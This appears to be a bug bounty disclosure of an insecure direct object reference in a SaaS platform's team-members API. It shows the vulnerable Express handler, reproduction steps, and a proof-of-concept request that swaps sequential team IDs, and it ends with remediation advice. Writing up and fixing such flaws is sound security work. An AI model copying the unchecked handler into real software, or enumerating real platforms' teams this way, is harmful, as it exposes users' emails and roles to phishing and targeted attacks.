# Title: Insecure Direct Object Reference in Team Members API Endpoint

- **Platform**: Cobalt
- **Program**: SaaS Collaboration Platform
- **Severity**: High
- **Date**: July 2025
- **Researcher**: Ousski
- **Bounty**: $1,200

## Summary

An Insecure Direct Object Reference (IDOR) vulnerability was discovered in a SaaS collaboration platform's REST API during a Cobalt penetration test. The `/teams/{team_id}/members` endpoint failed to verify that the requesting user belonged to the specified team, allowing any authenticated user to enumerate members of any team on the platform by simply manipulating the `team_id` path parameter.

## Technical Details

The application used a RESTful API architecture with team-based access controls. The endpoint `GET /teams/{team_id}/members` was designed to return all members of a team along with their roles, email addresses, and profile information. The authorization check only verified that the user was authenticated but did not verify team membership or ownership.

The vulnerable authorization logic was similar to:

```javascript
app.get('/teams/:team_id/members', authenticate, (req, res) => {
  const teamId = req.params.team_id;
  const members = db.query('SELECT u.id, u.username, u.email, tm.role FROM team_members tm JOIN users u ON tm.user_id = u.id WHERE tm.team_id = ?', [teamId]);
  res.json({ members });
});
```

No check such as `WHERE tm.user_id = ?` (the requesting user's ID) was performed, making `team_id` an unprotected direct object reference.

## Steps to Reproduce

1. Create two user accounts: Account A and Account B
2. Log in as Account A and obtain a valid session token
3. Note the `team_id` for Account A's team (e.g., `/teams/100/members`)
4. Using Account A's session token, change the `team_id` to that of Account B's team (e.g., `/teams/200/members`)
5. Observe that the API returns Account B's team member details without authorization

## Proof of Concept

```http
GET /teams/200/members HTTP/1.1
Host: app.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

Response:

```json
{
  "members": [
    {
      "id": 42,
      "username": "victim_user",
      "email": "victim@example.com",
      "role": "admin"
    },
    {
      "id": 43,
      "username": "member2",
      "email": "member2@example.com",
      "role": "viewer"
    }
  ]
}
```

The team IDs were sequential integers, making enumeration trivial. Automated enumeration could extract the member lists of all teams on the platform.

## Impact

- Unauthorized access to member lists of any team on the platform
- Exposure of user email addresses enabling targeted phishing campaigns
- Ability to map organizational structures and hierarchies
- Identification of team administrators for targeted attacks

In combination with other vulnerabilities, this could be chained to perform account takeover or social engineering attacks against privileged users.

## Remediation

- Implement server-side authorization checks that verify the requesting user is a member of the requested team
- Use a middleware function that extracts the user's team memberships from the session and compares them to the requested resource
- Consider using non-predictable identifiers (UUIDs) instead of sequential integers
- Implement rate limiting on API endpoints to slow enumeration attacks

## References
- https://ousski.medium.com/how-i-found-an-idor-and-got-paid-36a28d2ccdba
